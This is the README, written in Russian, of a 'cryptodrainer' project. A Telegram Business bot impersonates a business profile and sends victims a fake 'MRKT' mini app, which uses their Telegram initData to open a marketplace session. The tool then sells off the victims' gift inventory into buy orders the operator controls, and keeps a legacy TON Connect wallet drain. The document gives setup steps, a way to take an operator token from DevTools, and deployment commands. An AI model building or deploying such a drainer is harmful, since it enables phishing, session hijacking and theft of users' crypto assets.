# cryptodrainer — MRKT Business funnel + инвентарь по офферу

## Схема

1. **Business-бот** подключается к аккаунту (Telegram Business → чат-бот).
2. Клиент пишет в ЛС → ответ **от имени бизнес-профиля** + Web App «MRKT».
3. Mini app: `initData` → `POST https://api.tgmrkt.io/api/v1/auth` → **сессия MRKT** (TTL и лимиты в `.env`).
4. Тянем **инвентарь** (`POST /gifts`, `isListed: false`).
5. Для каждого подарка: **`POST /orders/top`** → **`POST /orders/fill`** (продажа в buy-ордер / «по офферу»).
6. Опционально: только ордера оператора (`MRKT_OPERATOR_ACCOUNT_ID` / `MRKT_ALLOWED_ORDER_IDS`), либо `sale_list` + `MRKT_AUTO_BUY_LISTED` с `OPERATOR_MRKT_TOKEN`.

Legacy: TON Connect drain (`/api/build-batch`) остаётся, если задан `RECEIVER_WALLET`.

## Пакеты

| Пакет | Роль |
|--------|------|
| `packages/bot` | Business polling, funnel, Web App URL с `?bc=` |
| `packages/server` | MRKT API, сессии, sweep, алерты, статика mini app |
| `packages/miniapp` | UI «Инвентарь MRKT», авто-сессия и sweep |

## Оператор (buy-ордера)

1. С основного аккаунта MRKT (Telegram @mrkt → Web) создай **buy-ордера** на нужные коллекции (`POST /orders/create` или вручную в UI).
2. Возьми `OPERATOR_MRKT_TOKEN` из DevTools → запрос к `api.tgmrkt.io` → заголовок `Authorization`.
3. `GET /me` на операторе → `MRKT_OPERATOR_ACCOUNT_ID`.
4. Включи `MRKT_RESTRICT_OPERATOR_ORDERS=true`, чтобы жертва продавала **только в твои** top-ордера.

Режим `MRKT_SELL_MODE=sale_list` — выставить на лот по `MRKT_FALLBACK_LIST_PRICE_NANO` и скупить оператором (`MRKT_AUTO_BUY_LISTED=true`).

## Лимиты сессии

`MRKT_SESSION_TTL_MS`, `MRKT_MAX_FILLS_PER_SESSION`, `MRKT_MAX_GIFTS_PER_SESSION` — «ограниченная сессия» из твоего ТЗ.

## Деплой

```bash
npm install
cp .env.example .env
npm run build
npm run start:server
npm run start:bot
```

HTTPS обязателен для Web App. `MINIAPP_PUBLIC_URL` = публичный origin.

## Auth initData

MRKT выдаёт токен по `Telegram.WebApp.initData`. Прогоняй на тесте: если auth падает с чужого бота, нужен initData в контексте `@mrkt` (RequestAppWebView / веб-ТГ) — либо MRKT уже принимает initData твоего WebApp.

## Business

BotFather → Business Mode. Аккаунт → Telegram Business → чат-боты → право «Отвечать». `/push <chat_id>` — ручной пуш.
